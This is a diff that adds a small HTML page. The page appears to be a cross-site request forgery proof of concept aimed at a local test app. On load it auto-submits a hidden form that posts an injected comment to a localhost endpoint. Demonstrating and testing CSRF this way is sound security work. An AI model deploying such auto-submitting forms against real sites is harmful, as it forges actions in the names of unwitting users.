@@ -1,0 +1,7 @@
+<html>
+<body onload="document.forms[0].submit()">
+  <form action="http://127.0.0.1:5000/submit_comment" method="POST">
+    <input type="hidden" name="comment" value="Comentario inyectado via CSRF">
+  </form>
+</body>
+</html>
